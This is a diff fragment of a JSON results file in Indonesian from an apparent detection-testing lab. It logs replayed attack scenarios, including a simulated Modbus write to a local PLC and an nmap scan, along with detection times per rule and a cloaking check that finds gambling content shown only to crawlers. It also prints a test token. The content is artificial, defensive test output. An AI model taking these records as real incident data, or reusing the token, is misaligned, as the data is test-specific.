+        "pesan": "heartbeat dijeda 45 detik"
+       }
+      }
+     },
+     "message": "10/10 skenario dijalankan"
+    },
+    "jenis": "run_test",
+    "params": {
+     "token": "9b578eeffd18797b9a92edc8614cd1e1",
+     "run_id": 1,
+     "scenarios": [
+      "R01",
+      "R02",
+      "R03",
+      "R04",
+      "R05",
+      "R06",
+      "R07",
+      "R09",
+      "R10",
+      "R12"
+     ]
+    },
+    "status": "dieksekusi",
+    "pemutus": "analis@sentra.lab",
+    "pengusul": "analis@sentra.lab",
+    "disetujui": "2026-11-08 02:48:47",
+    "diusulkan": "2026-11-08 02:48:47",
+    "dieksekusi": "2026-11-08 02:48:49",
+    "berlaku_sampai": null
+   },
+   {
+    "id": 4,
+    "hasil": {
+     "status": "success",
+     "details": {
+      "skenario": {
+       "R11": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:49.976+00:00",
+        "pesan": "tulis register uji 31 (FC6) ke PLC lokal"
+       }
+      }
+     },
+     "message": "1/1 skenario dijalankan"
+    },
+    "jenis": "run_test",
+    "params": {
+     "token": "9b578eeffd18797b9a92edc8614cd1e1",
+     "run_id": 1,
+     "scenarios": [
+      "R11"
+     ]
+    },
+    "status": "dieksekusi",
+    "pemutus": "analis@sentra.lab",
+    "pengusul": "analis@sentra.lab",
+    "disetujui": "2026-11-08 02:48:47",
+    "diusulkan": "2026-11-08 02:48:47",
+    "dieksekusi": "2026-11-08 02:48:49",
+    "berlaku_sampai": null
+   }
+  ],
+  "ujiKesiapan": {
+   "id": 1,
+   "mulai": "2026-11-08 02:48:47.103000",
+   "status": "selesai",
+   "cakupan": 1,
+   "selesai": "2026-11-08 02:49:56.418000",
+   "rata_ttd_ms": 4532
+  },
+  "ujiKesiapanHasil": [
+   {
+    "aturan": "R01",
+    "ttd_ms": 1250,
+    "catatan": null,
+    "skenario": "R01",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R02",
+    "ttd_ms": 1257,
+    "catatan": null,
+    "skenario": "R02",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R03",
+    "ttd_ms": 2099,
+    "catatan": null,
+    "skenario": "R03",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R04",
+    "ttd_ms": 795,
+    "catatan": null,
+    "skenario": "R04",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R05",
+    "ttd_ms": 751,
+    "catatan": null,
+    "skenario": "R05",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R06",
+    "ttd_ms": 710,
+    "catatan": null,
+    "skenario": "R06",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R07",
+    "ttd_ms": 3745,
+    "catatan": null,
+    "skenario": "R07",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R09",
+    "ttd_ms": 2179,
+    "catatan": null,
+    "skenario": "R09",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R10",
+    "ttd_ms": 1263,
+    "catatan": null,
+    "skenario": "R10",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R11",
+    "ttd_ms": 672,
+    "catatan": null,
+    "skenario": "R11",
+    "terdeteksi": 1
+   },
+   {
+    "aturan": "R12",
+    "ttd_ms": 35133,
+    "catatan": null,
+    "skenario": "R12",
+    "terdeteksi": 1
+   }
+  ],
+  "insidenDariEventUji": {
+   "jumlah": 0
+  },
+  "penjagaSitus": [
+   {
+    "waktu": "2026-11-08 02:50:00.313000",
+    "varian": "browser",
+    "ditandai": 0,
+    "kata_judi": 0,
+    "kemiripan": 1
+   },
+   {
+    "waktu": "2026-11-08 02:50:00.313000",
+    "varian": "googlebot",
+    "ditandai": 1,
+    "kata_judi": 8,
+    "kemiripan": 0.0682
+   },
+   {
+    "waktu": "2026-11-08 02:50:00.313000",
+    "varian": "referer",
+    "ditandai": 1,
+    "kata_judi": 8,
+    "kemiripan": 0.0682
+   }
+  ],
+  "auditJumlah": {
+   "baris": 22
+  },
+  "auditVerifikasi": {
+   "ok": true,
+   "checked": 22,
+   "broken_id": null,
+   "reason": null
+  }
+ },
+ "galat": [
+  {
+   "t": 1794105793701,
+   "di": "Tingkat Siaga Beranda berubah setelah nmap",
+   "pesan": "tidak terjadi dalam 60000 ms"
+  }
+ ]
+}
